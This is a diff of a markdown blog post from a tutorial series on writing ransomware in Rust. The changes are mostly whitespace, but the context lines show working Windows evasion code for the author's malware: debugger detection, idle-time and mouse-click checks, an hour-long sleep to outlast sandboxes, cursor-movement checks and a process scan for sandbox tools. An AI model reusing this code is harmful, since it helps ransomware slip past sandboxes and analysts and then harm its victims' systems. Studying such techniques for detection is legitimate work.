@@ -35,7 +35,6 @@ description: Rust Ransomware | Setup and anti-reversing techniques
 ```
     [target.'cfg(windows)'.dependencies]
     winapi = { version = "0.3", features = ["winuser"] }
-
 ```
 
 
@@ -72,7 +71,6 @@ description: Rust Ransomware | Setup and anti-reversing techniques
 
     ```
         winapi = { version = "0.3", features = ["debugapi"}
-
     ```
 
 
@@ -80,7 +78,6 @@ description: Rust Ransomware | Setup and anti-reversing techniques
 
 
     ``` rust
-
         #[cfg(windows)]
         extern crate winapi;
 
@@ -102,10 +99,9 @@ description: Rust Ransomware | Setup and anti-reversing techniques
             println!("Hello, world!");
             loop {}
         }
-
-
     ```
-
+    
+    
     - First, we check if *IsDebuggerPresent()* returns a 0 or any other number. If it's 0, the program is not being debugged, so we continue to print "Hello, world!"
 
 
@@ -131,8 +127,10 @@ description: Rust Ransomware | Setup and anti-reversing techniques
 
     - Since I'm a bit lazy, I'm not going to attempt this, but maybe we can come back for this another time!
   
+  
 #### II. Check for sandbox
 - There are a variety of sandbox-evasion techniques. I'm just going to list out a few of them for us to try and implement down here.
+  
   
 - If you are interested in more details, I suggest taking a look at [this research paper](https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667) 
 
@@ -145,7 +143,6 @@ description: Rust Ransomware | Setup and anti-reversing techniques
 
 
         ``` rust
-
             use winapi::um::sysinfoapi::GetTickCount;
             use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO};
 
@@ -163,16 +160,21 @@ description: Rust Ransomware | Setup and anti-reversing techniques
                     return false;
                 }
             }
-
         ```
+
 
     * The idle time can be calculated by subtracting the time of the last input event(*GetLastInputInfo*) from the time since the system was started(*GetTickCount*).
 
+
     * For *GetLastInputInfo*, it takes in a pointer to a LASTINPUTINFO struct according to [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getlastinputinfo). Therefore, we have to create the struct and put a 0u32 into dwTime field. After calling *GetLastInputInfo*, the system will write into this u32 the time of the last input event!
+        
         
     * Try calling this function in main() and you will see that the *idle_time* is typically 0 or 1 on your system.
         
+        
 * ***Logic bomb/sleep***: By implementing our malware as a logic bomb, we can stall the execution of the malware and have it sleeps.
+    
+    
     * Typically, a sandbox analyzes a malware in around 10-20 minutes, we can just go to sleep for a couple of hours and wake up after the sandbox's processing time!
 
 
@@ -183,12 +185,10 @@ description: Rust Ransomware | Setup and anti-reversing techniques
 
 
         ``` rust
-
         use winapi::um::synchapi::Sleep;
         pub fn sleep_for_an_hour() {
             unsafe { Sleep(3600000) }
         }
-
         ```
 
 2\. ***Detecting user interaction***
@@ -199,8 +199,8 @@ description: Rust Ransomware | Setup and anti-reversing techniques
 
 * We can make our malware wait for a certain user interactions before executing. The [Trojan.APT.BaneChan](https://www.fireeye.com/blog/threat-research/2013/04/trojan-apt-banechant-in-memory-trojan-that-observes-for-multiple-mouse-clicks.html) sits and waits for a number of mouse clicks before executing its malicious code. I figure we can use this trick!
 
-    ``` rust
 
+    ``` rust
     use winapi::um::winuser::{GetAsyncKeyState, VK_RBUTTON};
     pub fn check_mouse_click(min_clicks: u32) {
         let mut count: u32 = 0;
@@ -213,7 +213,6 @@ description: Rust Ransomware | Setup and anti-reversing techniques
             unsafe { Sleep(100) };
         }
     }
-
     ```
 
 
@@ -221,7 +220,6 @@ description: Rust Ransomware | Setup and anti-reversing techniques
 
 
     ``` rust
-
         use winapi::um::winuser::{GetCursorPos};
         use winapi::shared::windef::POINT;
         pub fn check_cursor_position() -> bool {
@@ -240,7 +238,6 @@ description: Rust Ransomware | Setup and anti-reversing techniques
 
             true
         }
-
     ```
 
 3\. ***Running Processes and Services:***
@@ -251,10 +248,10 @@ description: Rust Ransomware | Setup and anti-reversing techniques
 
 * In my code, I looked up how to [numerate all running processes from MSDN](https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes) and translate their C++ code into Rust.
     
-* Then I extract their names and compare it with a list of executable names that usually exists in sandbox environment.
+* Then I extract their names and compare them with a list of executable names that usually exists in sandbox environment.
   
-    ``` rust
-            
+  
+    ``` rust     
    pub fn check_process() -> bool {
        let mut a_processes: Vec<u32> = Vec::with_capacity(1024);
        let mut i = 0;
@@ -353,7 +350,6 @@ description: Rust Ransomware | Setup and anti-reversing techniques
            return process_name;
        }
    }
-
     ```
 
 ---
